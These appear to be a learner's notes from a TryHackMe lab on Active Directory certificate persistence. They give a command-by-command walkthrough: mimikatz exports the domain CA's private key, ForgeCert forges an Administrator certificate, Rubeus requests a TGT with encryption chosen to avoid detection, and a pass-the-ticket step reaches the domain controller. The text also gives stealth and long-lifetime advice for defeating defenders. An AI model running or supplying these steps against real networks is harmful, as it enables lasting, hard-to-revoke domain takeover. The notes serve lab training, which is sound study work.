WARNING: PERFORMING THESE ATTACKS WILL MOST LIKELY RESOLVE IN A FULL
DOMAIN REBUILD FROM THE OPPOSING BLUE TEAM IF THE FOLLOWING METHODS
ARE DESCOVERED INSIDE OF A VICTIM'S DOMAIN

We've leveraged domains to get certificates to become an admin, but now, 
we will be leveraging them for persistence! The beauty of this? They't cant
rid of it, unless it expires or they revoke it.. 
So, make sure to set the date for 5+ years and enjoy your extensive 
persistence; however, be stealthy!

We can use this to request a certificate to then request a TGT.
We can then continue requesting TGTs no matter however many times the 
blue team want to rotate the KRBTGT password!

Even worse, we could take it another step! We could simply steal the 
private key of the root CA's certificate to enjoy generating our own
certificates whenever we feel like it. Since these certificates were 
not generated by the CA, the blue team can't even revoke them!

This would mean rotating the CA, which would involve removing all the 
certificates and rotating the credentials of every single domain account, 
which would be hell on earth for the blue team.

Now, let's focus up, time to extract the private key:
C:\Users\Administrator.ZA>mkdir <username> 
C:\Users\Administrator.ZA>cd <username>
C:\Users\Administrator.ZA\am0>C:\Tools\mimikatz_trunk\x64\mimikatz.exe

- Making a directory, changing into it, then launching mimikatz.

Let's first see if we can view the certificates stored on the DC:
crypto::certificates /systemstore:local_machine

We then want to export the certificate:
privilege::debug
crypto::capi
crypto::cng
crypto::certificates /systemstore:local_machine /export

The exported certificates will be stored in both PFX and DER format to disk
dir

Take a look, see whichever one looks like its the domain controller and take
that.
Then, with this, itll download, and the default password will be mimikatz.

We could then generate our own certificate with the following, using 
the tool ForgeCert.

C:\Users\aaron.jones>C:\Tools\ForgeCert\ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123 

CaCertPath - The path to our exported CA certificate.
CaCertPassword - The password used to encrypt the certificate. By default, Mimikatz assigns the password of mimikatz.
Subject - The subject or common name of the certificate. This does not really matter in the context of what we will be using the certificate for.
SubjectAltName - This is the User Principal Name (UPN) of the account we want to impersonate with this certificate. It has to be a legitimate user.
NewCertPath - The path to where ForgeCert will store the generated certificate.
NewCertPassword - Since the certificate will require the private key exported for authentication purposes, we must set a new password used to encrypt it.

We can use Rubeus to request a TGT using the certificate we generated 
in order to verify that the certificate is trusted.

C:\Tools\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:<path to certificate> /password:<certificate file password> /outfile:<name of file to write TGT to> /domain:za.tryhackme.loc /dc:<IP of domain controller>


/user - This specifies the user that we will impersonate and has to match the UPN for the certificate we generated
/enctype -This specifies the encryption type for the ticket. Setting this is important for evasion, since the default encryption algorithm is weak, which would result in an overpass-the-hash alert
/certificate - Path to the certificate we have generated
/password - The password for our certificate file
/outfile - The file where our TGT will be output to
/domain - The FQDN of the domain we are currently attacking
/dc - The IP of the domain controller which we are requesting the TGT from. Usually, it is best to select a DC that has a CA service running

Once we execute, we will get our TGT.

We can then use mimikatz to load the TGT and authenticate to THMDC.

Launch Mimikatz exe
kerberos::ptt administrator.kirbi
exit

dir \\THMDC.za.tryhackme.loc\c$\ (checking if we have authenitcated)


